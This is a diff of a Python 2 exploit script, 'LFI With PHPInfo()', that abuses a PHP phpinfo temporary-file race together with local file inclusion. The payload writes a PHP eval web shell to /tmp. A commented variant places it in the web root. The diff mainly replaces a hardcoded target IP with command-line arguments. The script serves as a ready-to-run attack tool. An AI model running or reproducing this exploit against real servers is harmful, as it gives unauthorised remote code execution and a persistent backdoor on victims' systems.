@@ -1,19 +1,13 @@
-#!/usr/bin/python
-#python version 2.7
-
 import sys
 import threading
 import socket
-
-# 设置全局变量
-HOST = 198.18.9.116   # 你需要测试的域名
-PORT = 80             # 通常的HTTP端口
-POOLSZ = 200          # 线程池大小
 
 def setup(host, port):
     TAG = "Security Test"
     PAYLOAD = """%sr
 <?php file_put_contents('/tmp/Qftm', '<?php eval($_REQUEST[Qftm])?>')?>r""" % TAG
+    # PAYLOAD = """%sr
+    # <?php file_put_contents('/var/www/html/Qftm.php', '<?php eval($_REQUEST[Qftm])?>')?>r""" % TAG
     REQ1_DATA = """-----------------------------7dbff1ded0714r
 Content-Disposition: form-data; name="dummyname"; filename="test.txt"r
 Content-Type: text/plainr
@@ -32,13 +26,14 @@ Content-Length: %sr
 Host: %sr
 r
 %s""" % (len(REQ1_DATA), host, REQ1_DATA)
+    # modify this to suit the LFI script
     LFIREQ = """GET /index.php?file=%s HTTP/1.1r
 User-Agent: Mozilla/4.0r
 Proxy-Connection: Keep-Aliver
 Host: %sr
 r
 r
-""" % host
+"""
     return (REQ1, TAG, LFIREQ)
 
 def phpInfoLFI(host, port, phpinforeq, offset, lfireq, tag):
@@ -96,6 +91,7 @@ class ThreadWorker(threading.Thread):
                 return
 
 def getOffset(host, port, phpinforeq):
+    """Gets offset of tmp_name in the php output"""
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     s.connect((host, port))
     s.send(phpinforeq)
@@ -106,6 +102,7 @@ def getOffset(host, port, phpinforeq):
         d += i
         if i == "":
             break
+        # detect the final chunk
         if i.endswith("0rnrn"):
             break
     s.close()
@@ -114,24 +111,52 @@ def getOffset(host, port, phpinforeq):
         raise ValueError("No php tmp_name in phpinfo output")
 
     print "found %s at %i" % (d[i:i + 10], i)
+    # padded up a bit
     return i + 256
 
 def main():
     print "LFI With PHPInfo()"
     print "-=" * 30
 
-    host = HOST
-    port = PORT
-    poolsz = POOLSZ
+    if len(sys.argv) < 2:
+        print "Usage: %s host [port] [threads]" % sys.argv[0]
+        sys.exit(1)
 
+    try:
+        host = socket.gethostbyname(sys.argv[1])
+    except socket.error, e:
+        print "Error with hostname %s: %s" % (sys.argv[1], e)
+        sys.exit(1)
+
+    port = 80
+    try:
+        port = int(sys.argv[2])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print "Error with port %d: %s" % (sys.argv[2], e)
+        sys.exit(1)
+
+    poolsz = 10
+    try:
+        poolsz = int(sys.argv[3])
+    except IndexError:
+        pass
+    except ValueError, e:
+        print "Error with poolsz %d: %s" % (sys.argv[3], e)
+        sys.exit(1)
+
+    print "Getting initial offset...",
     reqphp, tag, reqlfi = setup(host, port)
     offset = getOffset(host, port, reqphp)
+    sys.stdout.flush()
 
     maxattempts = 1000
     e = threading.Event()
     l = threading.Lock()
 
     print "Spawning worker pool (%d)..." % poolsz
+    sys.stdout.flush()
 
     tp = []
     for i in range(0, poolsz):
@@ -163,3 +188,4 @@ def main():
 
 if __name__ == "__main__":
     main()
+
